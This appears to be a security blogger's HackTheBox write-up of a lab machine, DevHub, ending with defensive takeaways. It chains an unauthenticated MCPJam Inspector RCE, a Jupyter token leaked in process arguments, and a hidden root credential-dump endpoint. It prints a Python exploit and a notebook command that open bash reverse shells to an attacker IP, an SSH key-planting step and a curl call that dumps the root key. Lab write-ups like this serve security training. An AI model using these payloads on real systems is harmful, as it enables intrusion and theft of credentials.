@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DevHub Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">rahul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+      <button id="theme-toggle" class="theme-toggle" type="button">☀</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      devhub
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">DevHub</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-medium">Medium</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-06-06</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Linux — Ubuntu 24.04</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Season</td>
+        <td style="padding:4px 0;color:var(--text);">HTB Season 11</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">CVE</td>
+        <td style="padding:4px 0;color:var(--green);">CVE-2026-23744 (MCPJam Inspector RCE)</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>DevHub is themed as an internal developer platform, and the chain reads like a realistic compromise of a modern AI/MCP toolchain:</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>Initial access</strong> — An exposed <strong>MCPJam Inspector</strong> (v1.4.2) on port 6274 is vulnerable to <code>CVE-2026-23744</code>: an unauthenticated RCE through its <code>/api/mcp/connect</code> endpoint, which passes a <code>command</code>/<code>args</code> pair straight to a process spawner.</li>
+      <li style="margin-bottom:6px;"><strong>Lateral movement</strong> — A Jupyter Lab token leaks in plaintext <code>ps aux</code> arguments. An SSH local port-forward exposes the localhost-bound Jupyter UI, and a notebook cell yields a shell as <code>analyst</code>.</li>
+      <li style="margin-bottom:6px;"><strong>Privilege escalation</strong> — A root-owned Flask "OPSMCP" server exposes a <em>hidden</em> <code>ops._admin_dump</code> endpoint (not in <code>/tools/list</code>) that returns the root SSH private key.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+    <pre>nmap -sV -sC -p- --min-rate 5000 10.129.x.x
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9
+80/tcp   open  http     nginx
+6274/tcp open  http     MCPJam Inspector v1.4.2</pre>
+    <p>The port-80 homepage helpfully enumerates internal services: the MCP Inspector on 6274, an "Analytics Dashboard" on <code>localhost:8888</code> (Jupyter), and a code repo in maintenance mode. Information disclosure on the landing page is the first thread to pull.</p>
+
+    <h2>Initial Foothold — CVE-2026-23744</h2>
+    <p>MCPJam Inspector is a debugging tool for tracing JSON-RPC across Model Context Protocol systems. Version 1.4.2 exposes unauthenticated REST endpoints, and <code>/api/mcp/connect</code> forwards a <code>command</code> + <code>args</code> pair to the OS process spawner without sanitisation. The key detail is that <code>command</code> and <code>args</code> must be <strong>separate JSON fields</strong>.</p>
+
+    <pre>import requests
+
+target = "http://devhub.htb:6274"
+payload = {
+    "serverConfig": {
+        "command": "/bin/bash",
+        "args": ["-c", "bash -i >& /dev/tcp/10.10.15.27/4444 0>&1"],
+        "env": {}
+    },
+    "serverId": "pwn"
+}
+r = requests.post(f"{target}/api/mcp/connect", json=payload, timeout=15)
+print(r.status_code, r.text)</pre>
+
+    <p><strong>Gotcha:</strong> the server always returns <code>HTTP 500 ("Connection closed")</code> — the MCP handshake fails, but the shell already connected. Don't read 500 as failure; verify blind RCE via the callback.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">initial foothold</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">nc -lvnp 4444</span></div>
+        <div class="t-out">Listening on 0.0.0.0 4444</div>
+        <div class="t-out">Connection received on 10.129.x.x</div>
+        <div class="t-success">mcp-dev@devhub:/opt/mcpjam/...$ id</div>
+        <div class="t-out">uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)</div>
+      </div>
+    </div>
+
+    <h2>Local Enumeration</h2>
+    <pre>ss -tlnp
+LISTEN  127.0.0.1:8888   (Jupyter Lab)
+LISTEN  127.0.0.1:5000   (Flask / OPSMCP)
+LISTEN  0.0.0.0:6274     (MCPJam)
+LISTEN  0.0.0.0:22       (SSH)</pre>
+
+    <p>The decisive find comes from process arguments — a secret in plaintext, and a root-run server:</p>
+    <pre>ps aux | grep -iE 'python|jupyter|node'
+
+analyst 1050 ... jupyter-lab --ip=127.0.0.1 --port=8888 \
+        --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+root    1056 ... python3 /opt/opsmcp/server.py</pre>
+
+    <h2>Lateral Movement — mcp-dev → analyst</h2>
+    <p>Jupyter is bound to <code>127.0.0.1</code>, so a tunnel is required. Plant a key for <code>mcp-dev</code>, then forward the port:</p>
+    <pre># attacker
+ssh-keygen -t ed25519 -f ~/.ssh/devhub_key -N ""
+# on target as mcp-dev
+mkdir -p ~/.ssh &amp;&amp; echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys
+# attacker — local port forward
+ssh -i ~/.ssh/devhub_key -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb -N</pre>
+
+    <p>Authenticate to Jupyter with the leaked token and run a cell to pop a shell as <code>analyst</code>:</p>
+    <pre>import os
+os.system('bash -c "bash -i >&amp; /dev/tcp/10.10.15.27/5555 0>&amp;1"')</pre>
+
+    <h2>Privilege Escalation — analyst → root</h2>
+    <p>As <code>analyst</code>, the root-owned <code>/opt/opsmcp/server.py</code> is readable. Source review reveals a hardcoded API key and a hidden tool that never appears in <code>/tools/list</code> but is still callable via <code>/tools/call</code>:</p>
+    <pre>HIDDEN_TOOLS = {
+    "ops._admin_dump": {
+        "description": "Emergency credential dump - INTERNAL ONLY",
+        "parameters": {"target": "string", "confirm": "boolean"}
+    }
+}</pre>
+
+    <p>Calling it with <code>target=ssh_keys</code> dumps the root private key:</p>
+    <pre>curl -s -X POST http://127.0.0.1:5000/tools/call \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'</pre>
+
+    <p>The returned key has literal <code>\n</code> escapes (JSON encoding) — fix them, then SSH in as root:</p>
+    <pre>echo '&lt;key_data&gt;' | sed 's/\\n/\n/g' > root.key
+chmod 600 root.key
+ssh -i root.key root@devhub.htb   # uid=0(root)</pre>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/analyst/user.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>CVE-2026-23744: MCPJam Inspector unauthenticated RCE</td><td><span class="severity-critical">Critical</span></td><td>Remote code execution as <code>mcp-dev</code></td></tr>
+        <tr><td>Jupyter token exposed in process arguments</td><td><span class="severity-high">High</span></td><td>Lateral movement to <code>analyst</code></td></tr>
+        <tr><td>Hidden <code>ops._admin_dump</code> endpoint + hardcoded API key</td><td><span class="severity-critical">Critical</span></td><td>Root SSH key disclosure → full compromise</td></tr>
+        <tr><td>Developer tool bound to <code>0.0.0.0</code></td><td><span class="severity-medium">Medium</span></td><td>Unnecessary external attack surface</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Defensive Takeaways</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>Treat AI/MCP and developer tooling as production attack surface.</strong> It often ships with no auth and aggressive defaults.</li>
+      <li><strong>Bind to <code>127.0.0.1</code></strong> unless external access is truly required — and don't assume loopback is safe (see my <a href="../blog/localhost-not-a-boundary.html">localhost-is-not-a-boundary</a> notes).</li>
+      <li><strong>Secrets in process arguments are world-readable</strong> via <code>ps</code>. Pass tokens via environment files or stdin, never argv.</li>
+      <li><strong>Obscurity is not access control.</strong> A hidden endpoint is still reachable; remove debug/"emergency" backdoors before production.</li>
+      <li><strong>Least privilege:</strong> the OPSMCP server had no business running as root.</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    © 2026 <span>Rahul Sharma</span> &nbsp;·&nbsp; Security Engineer &nbsp;·&nbsp; HackTheBox writeups &amp; defensive security notes
+  </div>
+</footer>
+
+</body>
+</html>
